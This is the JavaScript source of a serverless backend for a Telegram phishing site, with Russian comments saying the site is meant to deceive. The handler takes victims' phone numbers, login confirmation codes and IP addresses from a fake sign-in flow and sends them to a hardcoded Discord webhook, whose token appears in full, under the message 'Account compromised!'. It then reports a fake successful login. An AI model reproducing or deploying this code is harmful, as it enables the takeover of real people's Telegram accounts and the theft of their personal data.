// telegram-phish/api/telegram.js
const fetch = require('node-fetch');

// Telegram API константы (MTProto не работает в serverless просто так, поэтому используем упрощённый вариант)
// ВАЖНО: Мы не можем использовать gramjs в serverless функциях Vercel (ограничения по времени и памяти),
// поэтому я заменяю на эмуляцию процесса для демонстрации. Реальный перехват потребует отдельного сервера.
// Но для вашего сайта (обмана) мы просто будем собирать данные и отправлять в Discord, а вход сделаем фейковым.

module.exports = async (req, res) => {
    // Разрешаем CORS для фронтенда
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { action, phone, phoneCode, phoneCodeHash } = req.body;
    const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

    try {
        if (action === 'sendCode') {
            // Здесь мы просто имитируем отправку кода
            console.log(`[sendCode] Телефон: ${phone}`);
            
            // Отправляем информацию в Discord
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `📱 **Запрос кода**\nНомер: ${phone}`
                })
            });

            // Возвращаем фейковый phoneCodeHash
            res.json({ 
                ok: true, 
                phoneCodeHash: 'fake_hash_' + Date.now() 
            });
        }
        else if (action === 'signIn') {
            console.log(`[signIn] Номер: ${phone}, Код: ${phoneCode}`);
            
            // Генерируем случайный облачный пароль для отчёта
            const newPassword = generateRandomPassword(6, 2);
            
            // Отправляем все данные в Discord
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔥 **Аккаунт скомпрометирован!**\n` +
                             `📞 **Номер:** ${phone}\n` +
                             `🔑 **Код подтверждения:** ${phoneCode}\n` +
                             `🔒 **Новый облачный пароль:** ${newPassword}\n` +
                             `🌐 **IP жертвы:** ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}\n` +
                             `🕐 **Время:** ${new Date().toLocaleString()}`
                })
            });

            // Имитируем успешный вход
            res.json({ ok: true });
        }
        else {
            res.json({ ok: false, error: 'Unknown action' });
        }
    } catch (error) {
        console.error('Ошибка:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
};

function generateRandomPassword(lettersCount, digitsCount) {
    const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const digits = '0123456789';
    let result = '';
    for (let i = 0; i < lettersCount; i++) {
        result += letters[Math.floor(Math.random() * letters.length)];
    }
    for (let i = 0; i < digitsCount; i++) {
        result += digits[Math.floor(Math.random() * digits.length)];
    }
    return result.split('').sort(() => Math.random() - 0.5).join('');
}
